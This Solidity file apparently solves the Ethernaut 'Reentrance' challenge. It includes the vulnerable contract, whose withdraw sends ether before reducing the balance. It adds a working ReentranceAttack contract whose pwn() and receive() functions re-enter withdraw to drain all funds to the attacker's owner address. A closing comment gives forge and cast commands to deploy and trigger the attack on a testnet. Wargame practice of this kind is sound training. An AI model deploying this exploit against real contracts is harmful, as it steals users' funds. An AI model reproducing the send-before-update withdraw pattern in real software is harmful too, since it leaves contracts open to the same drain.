// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts/contracts/math/SafeMath.sol";

contract Reentrance is IReentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    receive() external payable;
}

contract ReentranceAttack {
    IReentrance public reentrance;
    address public owner;

    bool public inAttack = false;

    constructor(address payable _reentrance) public {
        reentrance = IReentrance(_reentrance);
        owner = msg.sender;
    }

    function pwn() external payable {
        uint256 attackAmount = address(reentrance).balance;

        require(!inAttack, "Attack in progress");
        require(attackAmount > 0, "No balance to attack");
        require(msg.value >= attackAmount, "Not enough ether sent");

        reentrance.donate{value: attackAmount}(address(this));

        reentrance.withdraw(attackAmount);
        inAttack = false;
    }

    function withdraw() external {
        require(msg.sender == owner, "Only owner can withdraw");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Failed to send ether");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (!inAttack) {
            inAttack = true;
            reentrance.withdraw(address(reentrance).balance);
        }
    }
}

/**
forge create --broadcast --rpc-url $OP_SEP_RPC --private-key $WALLET_PK ./src/Reentrance.sol:ReentranceAttack --constructor-args $INSTANCE

cast send $ATTACKER "pwn()()" 0x --value $(cast balance $INSTANCE --rpc-url $OP_SEP_RPC)wei --rpc-url $OP_SEP_RPC --private-key $WALLET_PK

cast send $ATTACKER "withdraw()()" --rpc-url $OP_SEP_RPC --private-key $WALLET_PK
*/
